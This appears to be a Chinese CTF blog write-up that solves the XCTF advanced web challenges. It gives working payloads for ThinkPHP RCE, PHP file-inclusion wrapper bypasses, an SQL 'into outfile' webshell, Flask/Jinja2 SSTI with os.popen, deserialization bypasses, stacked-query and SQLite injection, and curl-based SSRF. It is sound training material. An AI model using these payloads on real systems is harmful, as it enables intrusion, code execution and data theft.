---
title: XCTF攻防世界 WriteUp(Web)
date: 2020-03-19 14:44:39
categories:
  - CTF
---

感觉XCTF这个平台还是8错的，题目量也多质量也还可以，准备后面慢慢刷

新手区还是太简单了。。。这里就不放WriteUp了，直接整进阶区的

平台链接：<https://adworld.xctf.org.cn/task>

<!-- more -->

## baby_web

> Hint:想想初始页面是哪个

打开页面会自动跳转至1.php，尝试输入index.php访问，然后发现302跳转至1.php，然后在302响应头里找到flag：

![](https://pic.hujiekang.top/uploads/big/78d8b2b1c181e8abe834a78b436781e3.png)

## Training-WWW-Robots

这题。。。已经明示了，访问robots.txt，得到目录/fl0g.php，访问直接拿到flag：`cyberpeace{f6c970f5e54f9ddf6964b44b35732dfe}`

## php_rce

这题一打开是一个ThinkPHP的默认界面：

![](https://pic.hujiekang.top/uploads/big/298a55c8f5131105fb28485491237373.png)

一开始先试了一下，访问一哈404的目录，发现只是返回正常的404界面；然后给主页加一些乱七八糟的参数，返回了错误，错误中泄露了软件版本（后面发现是我蒙中了s参数）：

![](https://pic.hujiekang.top/uploads/big/00f8371efa15696e55465f8fbfc3d79b.png)

然后呢。。。就没有然后了，找了半天毛都找不到，robots.txt也没有信息。。。

于是百度，发现ThinkPHP 5.x好多版本都有RCE。。。emmm准备后面专门研究一下ThinkPHP的代码，这里先放一个Payload：

`http://111.198.29.45:41137/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name *flag*`

通过这些参数执行了Linux的`find`指令，找到了flag所在目录/flag，于是执行`cat /flag`，拿到flag：

![](https://pic.hujiekang.top/uploads/big/1068344b5b7d17e153dd36f690cd9c54.png)

当然肯定不止这种解法，就这都任意文件写入了，直接写个马也是没问题的。

参考资料：[ThinkPHP5框架缺陷导致远程命令执行](https://www.cnblogs.com/bmjoker/p/10110868.html)、[ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析](https://xz.aliyun.com/t/3845)

## Web_php_include

源代码已给出：

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

这题好多解法的亚子。。。我想到的就有两种，主要思想就是文件包含和任意命令执行。

1. 双写+`php://`伪协议

   Payload1：`?page=PhP://input`+POST任意PHP命令

   ![](https://pic.hujiekang.top/uploads/big/d9d18d00119f5e2ea1e264ac8802588e.png)

![](https://pic.hujiekang.top/uploads/big/392a1a3fa10889d4ff7a822402d7c705.png)

​	Payload2：`?page=PhP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php`，解码拿到flag

![](https://pic.hujiekang.top/uploads/big/6649ad9a674a7f10451ec1450cf2d440.png)

2. data协议任意命令执行（明文和base64都可）

   Payload：`?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmw0Z2lzaXNpc2gzcjMucGhwIik7Pz4=`

   ![](https://pic.hujiekang.top/uploads/big/95dad4b8af770cb67bfa7ff961a93795.png)

还有几种方法是看了别人的WriteUp做的，感觉自己脑洞还不够大。。。

3. phpMyAdmin

   御剑可以扫到phpMyAdmin和phpinfo，而且phpMyAdmin没有密码。。。然后直接登进去输入SQL语句实现本地文件包含：

   ```sql
   select "<?php eval($_POST['evil']);?>" into outfile "/tmp/evil.php";
   ```

4. <s>套娃</s>

   这个真的难想。。。绕了半天才想清楚

   之前一直忽略了`echo $_GET['hello'];`这行代码，然后发现可以用。。。

   因为`show_source(__FILE__);`这行代码输出的代码都是经过HTML实体编码的无法被`include`识别，而我们可以任意掌控`hello`这个参数的值，所以如果使用HTTP协议让`page`参数为一个带有`hello`参数输出的index.php，那么也可以利用`hello`参数进行任意命令执行（前提是php.ini中的`allow_url_include`设置为了`On`）：

   Payload：`?page=http://localhost/index.php?hello=<?show_source("fl4gisisish3r3.php");?>`

   ![](https://pic.hujiekang.top/uploads/big/84911978bf4908a1c8e41420ff72b28f.png)

## warmup

打开首页就一张滑稽图片，然后查看源代码发现source.php，访问拿到源代码：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
?>
```

先访问一下hint.php，得到`flag not here, and flag in ffffllllaaaagggg`

于是进行一波代码审计：首先要求传入参数`file`不为空且是字符串，然后要让`emmm::checkFile($_REQUEST['file'])`函数返回true，就会把`file`参数的值`include`进来，否则就显示滑稽。

再看`emmm::checkFile()`方法：

![](https://pic.hujiekang.top/uploads/medium/2c16c568431b4c7c3010cb8fb57bbf6b.png)

一共有三个地方可以令这个方法返回true，如果是直接满足第一个条件的话，那我们就无法加其他的东西进去了；后面两个条件是有办法加东西进去的，所以考虑后面两个条件的满足。

截取字符串用了`mb_substr()`和`mb_strpos()`两个函数来进行，只截取字符串中第一个`?`之前的字符进行判断，所以我们就可以在`?`后面加入其他的东西，下面是我在本地测试的结果：

我在网站根目录的上一级放了一个只有一个`echo`语句的test.php文件，然后网站主页使用source.php的代码。首先在第二个条件进行绕过，令参数`file=hint.php?/../../test.php`，发现报错：

![](https://pic.hujiekang.top/uploads/big/bed5f4ba3019165bc7057e98b7639630.png)

然后查了一下[资料](https://stackoverflow.com/questions/41985625/file-get-contents-failed-to-open-stream-no-error)，发现是`?`后面的字符被当成了传入hint.php的参数，而本地文件包含和读取是不允许参数存在的，所以报错。一般情况下，可以通过使用HTTP协议来解决这个问题，但这里显然是不行的。

第二个条件不行，那么尝试满足最后一个条件，把`?`进行二次URL编码得到`%253f`，令`file=hint.php%253f/../../test.php`，发现成功读取到文件：

![](https://pic.hujiekang.top/uploads/big/df478300cf9b7a8ee523efbf59672764.png)

关于这个包含路径的问题，感觉比较迷，一开始想了半天想不通为什么访问上一级文件夹的内容要两个`../`，后来就查了一下，下面是一个解释：

>  当在字符`/`前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含`/`后面的文件——注意是最后一个`/`。

但我觉得嘛。。。emmmm这并没有解决我的疑惑，于是我就自己强行理解了一波，也不知道对不对，大佬轻喷：

> 首先把输入的相对路径拼接成一个绝对路径，如上面的就被拼接成`D:/phpstudy/WWW/hint.php%253f/../../test.php`，于是此时`hint.php%253f`就被当成了一个目录，但是PHP先不管它存不存在，而是按照这个逻辑去进行访问，所以`D:/phpstudy/WWW/hint.php%253f/../`等价于`D:/phpstudy/WWW/`，再返回一次就等同于是根目录的上一级了。

然后就可以做题了，由hint得知flag文件名`ffffllllaaaagggg`，所以靠着相对路径一步一步往前摸，最后可以摸到flag：

![](https://pic.hujiekang.top/uploads/big/4a89194f159f0c3c01c98c66b496e39d.png)

做完了题又查了一下，发现这个题是phpMyAdmin的一个LFI漏洞：<https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog>

## NewsCenter

一个最简单的SQL注入，没有任何过滤。。。

首先试探是否存在注入，发现or语句直接出来所有数据：

![](https://pic.hujiekang.top/uploads/big/b917f12a795fd78d9229a8d8b2ebfb20.gif)

然后就用SQLMap爆：`python sqlmap.py -r 1.txt --dump`

![](https://pic.hujiekang.top/uploads/big/9534e803f1ccee29ed8132313e211abf.png)

## NaNNaNNaNNaN-Batman

题目文件：[点击下载](https://o.hujiekang.top/downloads/1686bc246b6841428465673ad4c7c980.zip)

文件是个压缩包，解压后得到文件web100，内容如下：

```html
<script>
    _='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';
    for(Y in $='	')
        with(_.split($[Y]))_=join(pop());
    eval(_)
</script>
```

看着像一段js脚本，于是复制下来一句一句的执行，执行完那个`for`循环后拿到一段代码：

```js
function $() {
	var e = document.getElementById("c").value;
    if (e.length == 16)
        if (e.match(/^be0f23/) != null)
            if (e.match(/233ac/) != null)
                if (e.match(/e98aa$/) != null)
                    if (e.match(/c7be9/) != null) {
                        var t = ["fl", "s_a", "i", "e}"];
                        var n = ["a", "_h0l", "n"];
                        var r = ["g{", "e", "_0"];
                        var i = ["it'", "_", "n"];
                        var s = [t, n, r, i];
                        for (var o = 0; o < 13; ++o) {
                            document.write(s[o % 4][0]);
                            s[o % 4].splice(0, 1)
                        }
                    }
}
document.write('<input id="c"><button onclick=$()>Ok</button>');
delete _
```

发现这代码会生成一个输入框，然后把输入内容进行正则表达式和长度匹配，全部满足就打印出flag。

观察正则表达式发现，字符串必须以`be0f23`开头，以`e98aa`结尾，而单纯的把四个正则表达式直接输入进去也是不可行的，因为有长度的限制。但是这些正则表达式之间存在一些重复的字符串，可以合并，合并结果为`be0f233ac7be98aa`，把最开始那段代码放在本地运行，然后输入就可以拿到flag：`flag{it's_a_h0le_in_0ne}`

## PHP2

这题打开毛都没有，只有一句话：

> Can you anthenticate to this website?

然后就试一下常用的文件名，最后在index.phps找到了源代码：

> 从别人的WriteUp里面挖来的新知识：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但**为了国际通用，所以才用了phps文件类型**。 它的MIME类型为：`text/html`, `application/x-httpd-php-source`, `application/x-httpd-php3-source`。

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

然后就很简单了，二次URL编码即可：

![](https://pic.hujiekang.top/uploads/big/90eeab8124fc136fa35b75c8b98b6882.png)

## unserialize3

![](https://pic.hujiekang.top/uploads/big/e0c2a18f3927c317d392d1a4237b65a3.png)

这题完全就是明示了，直接通过`__wakeup()`的CVE-2016-7124漏洞绕掉，Payload：`?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

## upload1

这题。。。就一个上传文件的，查看源代码发现只有前端验证扩展名，直接抓包改扩展名，直接挂马：

![](https://pic.hujiekang.top/uploads/big/ee2185536297b91dfc72f72f15dce9ee.png)

![](https://pic.hujiekang.top/uploads/big/25683a1e558c4b6caafad1e61d513ea3.png)

## Web_python_template_injection

这题考的是Python Flask模板注入，大概原理是Flask可以在网页中包含变量，只需要使用`{ { } }`包住即可，然后通过调用一些对象的`__mro__`和`__subclasses__`等一些属性，可以定位到一些可以进行一些骚操作的类，一顿操作之后可以定位到os模块以及File模块等，然后就可以以这种方式进行RCE或者任意文件写入了；还有一种是使用Flask框架内部的一些方法来操作，这个还没有实践过也不是很清楚，后面再做详细的分析吧。

这道题首先用一个脚本，找一下哪里有os模块：

```python
from flask import *
cnt = 0
for i in [].__class__.__base__.__subclasses__():
    try:
        if 'os' in i.__init__.__globals__:
            print(cnt,i)
    except:
        pass
    cnt += 1
# print([].__class__.__base__.__subclasses__()[452].__init__.__globals__['os'].popen("ver").read())
```

奇怪的是，如果不导入flask模块，使用Python3无法跑出任何结果，且一些文章里面说到的两个调用了os模块的`<class 'site._Printer'>`和`<class 'site.Quitter'>`只有在Python2中才能跑出来，不知道是我本地环境的原因还是啥。

后面就直接读取这个类里面的全局变量，调用对应的模块，常用的比如这里的`os.popen()`，可以直接返回命令输出结果，用起来还是很方便的。

回到这道题叭。这题的环境里面，可以调用到`<class 'site._Printer'>`和`<class 'site.Quitter'>`这两个类，所以就更加方便了，直接上Payload：

![](https://pic.hujiekang.top/uploads/big/c31b61ef4fa34881c7832d5c2726a5c3.png)

然后`os.popen('ls')`找到flag文件fl4g，再来一哈`os.popen('cat fl4g')`轻松拿到flag。

还有一个Payload，是HackBar里面提供的默认Payload，一起放上来做个参考：`{ { config.__class__.__init__.__globals__['os'].popen('ls').read() } }`

参考文章：<https://www.freebuf.com/column/187845.html>、<https://www.freebuf.com/articles/web/98619.html>、<https://www.freebuf.com/articles/web/98928.html>

## Web_php_unserialize

直接给出源代码：

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {
        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
?>
```

这题就很简单了，还是绕过`__wakeup()`，但是这里还需要绕过一个正则表达式，这个正则表达式过滤了反序列化对象中类似于`O:1:`、`C:1:`的字符串，看了一下别人的WriteUp，发现对象成员数量可以用`+`绕过：

Payload：`?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`（注意反序列化对象里面的`\x00`字符）

![](https://pic.hujiekang.top/uploads/big/2cdbbfa15d696da7fc08885ad1e97ec1.png)

## supersqli

这题是一个比较特别的SQL注入，之前没碰到过

![](https://pic.hujiekang.top/uploads/big/bc1bd510c83e4b2b6de5e1d2190a0d0b.png)

一开始先尝试注了一下，发现有错误回显，然后摸到是字符型注入，使用`--+`注释可以注入，`order by`也可以执行，猜出来表列数为2，但是想用union的时候，发现被过滤了：

![](https://pic.hujiekang.top/uploads/big/5de806e3b4f1059d8198af46347869d2.png)

由于开了不区分大小写，而且双写也莫得。。。所以这些关键字就没办法绕了，只能想点别的办法

试一下多语句执行，发现可以整：

![](https://pic.hujiekang.top/uploads/big/b390d81db44d31cdc639180e8bcbd0b9.png)

然后又`show columns`了一下，发现flag在`1919810931114514`数据表里面，那么接下来就是想办法把数据显示出来。

于是又看了一遍菜鸟SQL教程，发现可以对数据表和数据列改名，那应该把flag的数据表换掉原来的数据表就能成了。

```
alter table `1919810931114514` change `flag` `id` varchar(100);
alter table `words` rename to `words1`;
alter table `1919810931114514` rename to `words`;
```

把这三条放在一个请求里全部执行之后，此时默认读取数据表已经发生了改变，所以直接用`1' or 1=1--+`就可以直接拿到flag：

![](https://pic.hujiekang.top/uploads/big/1cbf22575ced20946a3c7db8797d2987.png)

通过这题学到了一种新的SQL注入形式，如果在生产环境下这么搞，然后过滤条件还没这里严谨的话，那<s>删库跑路也不是不可以</s>

## easytornado

> Hint: Tornado 框架

主页面有三个链接，全部点了一下：

```
/flag.txt
flag in /fllllllllllllag
/welcome.txt
render
/hints.txt
md5(cookie_secret+md5(filename))
```

然后发现参数有`filename`以及`filehash`，hints.txt下面告知了`filehash`的计算方式，flag.txt告知了flag的位置，那么接下来还有一个`cookie_secret`没有整出来

然后爬了一下官方文档，发现`cookie_secret`是用来给cookie进行签名的，以保证cookie的安全性。同时还发现`cookie_secret`存在于Tornado的Web应用对象中的`settings`字典里面：

>（摘自Tornado框架中文文档）
> 传递给构造器的附加关键字参数保存在`settings`字典中, 并经常在文档中被称为”application settings”. Settings被用于自定义Tornado的很多方面(虽然在一些情况下, 更丰富的定制可能是通过在`RequestHandler`的子类中复写方法). 一些应用程序也喜欢使用`settings`字典作为使一些处理程序可以使用应用程序的特定设置的方法, 而无需使用全局变量.
> `cookie_secret`: 被`RequestHandler.get_secure_cookie`使用, `set_secure_cookie`用来给cookies签名.

由于Tornado也是基于Python开发的，所以同样想到模板注入，随意输入filename摸到一个错误界面，发现`msg`参数可控：

![](https://pic.hujiekang.top/uploads/big/62c09c1118eb6700b100955bfada0355.png)

然后试了一下传入`{ { application.settings } }`，就500了。。。估计做了一些过滤措施叭

然后又翻文档，发现另一个对象`RequestHandler`，这个对象是用来处理网站的请求的，在它的构造方法里面，传入了要处理请求的Web应用对象，并且有一个`settings`方法，会返回这个`application`的`settings`：

![](https://pic.hujiekang.top/uploads/big/385bef9ab16370675017f973b3d5165c.png)

而且从注释里面看出，Tornado还有一套别名机制，估计是为了方便调用做出来的

> （摘自Tornado框架中文文档）
>
> - `escape`:`tornado.escape.xhtml_escape`的别名
> - `xhtml_escape`: `tornado.escape.xhtml_escape`的别名
> - `url_escape`: `tornado.escape.url_escape`的别名
> - `json_encode`: `tornado.escape.json_encode`的别名
> - `squeeze`: `tornado.escape.squeeze`的别名
> - `linkify`: `tornado.escape.linkify`的别名
> - `datetime`: Python`datetime`]模块
> - **`handler`: 当前的`RequestHandler`对象**
> - `request`:`handler.request`的别名
> - `current_user`:`handler.current_user`的别名
> - `locale`:`handler.locale`的别名
> - `_`:handler.locale.translate`的别名
> - `static_url`:`handler.static_url`的别名
> - `xsrf_form_html`:`handler.xsrf_form_html`的别名
> - `reverse_url`:`Application.reverse_url`的别名
> - 所有从 `ui_methods` 和 `ui_modules` `Application` 设置的条目
> - 任何传递给`render`或`render_string`的关键字参数

`RequestHandler`对象有个别名叫`handler`，所以是不是可以通过`handler.settings`访问到`settings`字典呢？理论上行得通，实际上也没错：

![](https://pic.hujiekang.top/uploads/big/5797bee30b5814c3d04674190ea070bc.png)

拿到了`cookie_secret`，接下来使用md5做对应的操作就可以算出/fllllllllllllag对应的filehash值：

```php
<?php
echo md5('69cd0335-5640-41b3-b594-1c7a4d1cd380'.md5('/fllllllllllllag'));
// Result: 361e9154ca34a280ef2d0b28ff5d2319
?>
```

访问`?filename=/fllllllllllllag&filehash=361e9154ca34a280ef2d0b28ff5d2319`，拿到flag：`flag{3f39aea39db345769397ae895edb9c70}`

参考链接：[Tornado中文文档](https://tornado-zh.readthedocs.io/zh/latest/index.html)、[Tornado Documentation](https://www.tornadoweb.org/en/stable/index.html)

## ics-06

> 云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。

这题目是一道爆破题，一开始还以为是注入，结果后来才发现不对劲。。。

![](https://pic.hujiekang.top/uploads/big/591a202a601207001fab4b4f122de8ad.png)

打卡页面是一个假的管理系统界面，主页只有一张图片，而且侧边栏只有报表中心可以跳转，其他都是假的

访问报表中心来到index.php，有个输入日期的框框，但是查了一下源代码，发现只是个框框，没有提交任何数据给服务器，然后发现`id`参数，尝试注入，发现输入任何非数字参数都会直接跳转至`id=1`，而输入数字则不会。

然后就想到爆破：

![](https://pic.hujiekang.top/uploads/big/382eda1a8aa93b21434c788b6a44aa8f.png)

## lottery

一个代码审计题，打开是一个买彩票的游戏界面，主页介绍了游戏规则，使用一个用户名就可以创建一个账户，然后给你20块，只要赢了9990000块就可以买flag了

附件：[点击下载](https://o.hujiekang.top/downloads/f2920a7744a8413a8b0cb95f7ba0ab3e.zip)

![](https://pic.hujiekang.top/uploads/big/4060cdb7e6d409fca18d6059cdea1f5f.png)

一开始先玩了一下，果然一下子把钱输完了……然后看源代码，发现生成彩票号码和确认是否中奖的代码逻辑在api.php中：

![](https://pic.hujiekang.top/uploads/big/3fa17068ce89997c968a4538184f88db.png)

这是彩票的中奖数字生成算法，用了一个没有见过的随机字节串生成函数`openssl_random_pseudo_bytes()`，用的是强加密算法，PHP文档里面这么解释的：

> openssl_random_pseudo_bytes ( int `$length` [, bool `&$crypto_strong` ] ) : string
>
> 生成一个伪随机字节串 string ，字节数由 `length` 参数指定。
>
> 通过 `crypto_strong` 参数可以表示在生成随机字节的过程中是否使用了强加密算法。返回值为`FALSE`的情况很少见，但已损坏或老化的有些系统上会出现。

整个生成算法大概就是：生成一个10字节的随机串，然后取了对应的ASCII码，当其小于250时就除以25，然后向下取整，说白了就是生成一个0~9的随机数。

再看看中奖算法：

```php
function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
	}
	$money += $prize - 2;
	$_SESSION['money'] = $money;
	response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
}
```

可以看见有个`for`循环，逐字符的检查输入值和彩票值是否匹配，但是用的是`==`弱类型比较，所以。。。尝试传入别的类型的数据使得条件恒成立试试：

抓包：

![](https://pic.hujiekang.top/uploads/big/ccabde59200024ec56c849e91ad03c13.png)

我把numbers参数的值从字符串改成了一个布尔数组，这样传进去的话`$numbers = $req['numbers'];`这句得到的就是一个布尔数组，循环里面每次比较都是`"数字"==true`，虽然有0的情况出现，但至少中奖几率大了很多啊。

多搞了几次，成功拿到几千万，然后去买flag：

![](https://pic.hujiekang.top/uploads/big/5e524c82c66082f71e2638d3d05a301c.png)

## mfw

这题做过原题了，[传送门](/2020/03/10/jarvisoj-wp/#61dctfbabyphp)

## web2

```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function encode($str){
    $_o=strrev($str);
    // echo $_o;

    for($_0=0;$_0<strlen($_o);$_0++){

        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;
    }
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?>
```

这题超简单，逆向一下算法就行

稍微理一下算法流程：

1. 字符串反向
2. 每个字符的ASCII码+1
3. base64
4. 字符串反向
5. rot13

把这个流程反过来就能输出明文：

```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function decode($str){
    $str1 = base64_decode(strrev(str_rot13($str)));
    for ($i = 0;$i < strlen($str1);$i++){
        $str2 .= chr(ord($str1[$i]) - 1);
    }
    return strrev($str2);
}

echo decode($miwen);
?>
```

输出`flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}`

## shrine

这题是Flask/Jinja2 SSTI，打开直接拿源代码：

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{ {% set {}=None %} }'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

很容易发现`/shrine`目录下存在模板注入，但是有一些限制，`safe_jinja()`函数过滤了括号和关键字`config`、`self`，然后flag在`app.config`下。

尝试访问`/shrine/{{4*4}}`，输出为16，说明确实有注入。接下来就是想办法拿到`app.config`的内容。首先过滤了括号，找父类`object`再找子类调用模块肯定不行了，得想别的办法。

查资料得知可以通过寻找`current_app`对象来拿到`app.config`，还可以通过`app`对象的`__dict__`属性来列出`config`信息。

此时可用的上下文或函数有`url_for`, `g`, `request`, `namespace`, `lipsum`, `range`, `session`, `dict`, `get_flashed_messages`, `cycler`, `joiner`, `config`，而此时`config`肯定不能直接用，于是试着找它们的全局变量`__globals__`，发现`url_for`和`get_flashed_messages`的全局变量里面有`current_app`对象：

![](https://pic.hujiekang.top/uploads/big/4e13acfcecf7abeffc306a9138a1a46f.png)

然后构造Payload`url_for.__globals__['current_app'].config['FLAG']`和``get_flashed_messages.__globals__['current_app'].config['FLAG']`就能拿到flag。

另一个思路，`app`对象的`__dict__`属性，可以通过调用模块`sys`找到：`app.__init__.__globals__.sys.modules.app.app.__dict__.config['FLAG']`

![](https://pic.hujiekang.top/uploads/big/014e610ce8ebad092b5b26206e999c4a.png)

然后找了半天，又发现了另一个思路：通过递归查找`request`对象的属性和函数找到`config`，传送门<https://ctftime.org/writeup/10851>。这个代码不是很看得懂（Python是真的菜），但是稍微改了一下代码，令其显示所有结果，但是还是只有这一个`request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']`，估计只找到了这一个。

再总结一下Jinja2的SSTI中拿`config`的方法：

1. `__class__, __base__, __mro__, __subclasses()`调用模块
2. `url_for、get_flashed_messages`等函数/属性的全局变量
3. `sys`模块中找`app.__dict__`

> 参考资料： https://www.cnblogs.com/wangtanzhi/p/12238779.html、 https://www.cnblogs.com/20175211lyz/p/11425368.html、 https://ctftime.org/writeup/10851、 https://glarcy.github.io/2019/03/11/SSTI模板注入/、 https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/


## fakebook

![](https://pic.hujiekang.top/uploads/big/1914f67bceb021bb943d60d5dd1802e6.png)

一开始看见login，以为登录框有SQL注入，然后点join，输入信息后就可以在网站里面添加一条数据。

![](https://pic.hujiekang.top/uploads/big/ea94e6efc348c3cd853702a84502ef50.png)

点击用户名，来到`/view.php?no=1`，然后又感觉这里也可以注入，先对login测了一下，发现好像莫得注，然后对这里试了一下`no=1'`，发现报错。

然后就是一阵愉快的`union select`，然后发现对空格做了过滤，尝试注释绕过，成功：

![](https://pic.hujiekang.top/uploads/big/ad4cab158573d6d00f79ca442bc03d11.png)

接下来就用SQLmap去跑，发现怎么都弄不下来数据，所以只能手工注了：爆出字段`no`，`username`，`passwd`，`data`，前三个数据就是在join输入的数据，只有`data`，是一段序列化对象：

![](https://pic.hujiekang.top/uploads/big/e936488912940d9ad9ad203cb54706ed.png)

然后看了以下正常的网页源码，加载Blog内容的地方有一个iframe，src里面是一段base64，于是猜能不能改变这个参数来读文件，尝试改变blog参数为`file:///var/www/html/view.php`，直接丢到`union select`里面去，发现源码里面的iframe src变长了，一解码直接拿到源码：

![](https://pic.hujiekang.top/uploads/big/020d4e8fde194dc6b9105ff8b97d5ff3.png)

于是通过这个可以顺藤摸瓜拿到所有代码，拿到`user.php`中发现读取blog内容靠的是`curl`，也就难怪可以使用`file:///`协议读取了。（后来看WriteUp发现robots.txt直接给了`user.php`的备份文件）

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

然后尝试读一下`flag.php`（别问 问就是猜），就拿到了flag：

![](https://pic.hujiekang.top/uploads/big/51786ec87c11b34c8325205236ec488b.png)

## FlatScience

在这题第一次接触SQLite的注入，感觉比MySQL的简单一点点

![](https://pic.hujiekang.top/uploads/big/3cdf22e7a86151d7eac6f2e5213c8cff.png)

打开页面显示的是一个教授的个人网站的半成品，说是里面有一些他写的论文，然后附了几个链接，全部点了一遍，除了PDF的其他链接都是在来回跳转，没有什么信息。

然后在`robots.txt`里面发现`/login.php`和`/admin.php`。

访问`/admin.php`源代码提示`<!-- do not even try to bypass this -->`，估计是没有注入。访问`/login.php`，源代码中发现提示GET参数debug，请求后返回源码：

```php
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];
        $db = new SQLite3('../fancy.db');
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }
    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }
}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
```

看着应该有一个SQLite的注入。百度一下发现SQLite里面也有一个系统表`sqlite_master`，其结构看起来如下：

```sql
CREATE TABLE sqlite_master (
    type TEXT,
    name TEXT,
    tbl_name TEXT,
    rootpage INTEGER,
    sql TEXT
);
```

也就是说可以通过type和name来读数据表的信息，因为可以直接读到创建表的SQL语句，所以相当于也可以拿到列信息。尝试union，就拿到了所有数据表的SQL语句（这里只有一个Users）

![](https://pic.hujiekang.top/uploads/big/662abb903dfd8a22ee090e9658bf0c37.png)

Users表有`id`、`name`、`password`、`hint`4列，也可以分别读出来，Payload：`0' union select id,group_concat(password) from Users--+`

读到Users表的数据如下：

| id   | name   | password                                 | hint                          |
| ---- | ------ | ---------------------------------------- | ----------------------------- |
| 1    | admin  | 3fab54a50e770d830c0416df817567662a9dc85c | my fav word in my fav paper?! |
| 2    | fritze | 54eae8935c90f467427f05e4ece82cf569f89507 | my love is鈥�?                |
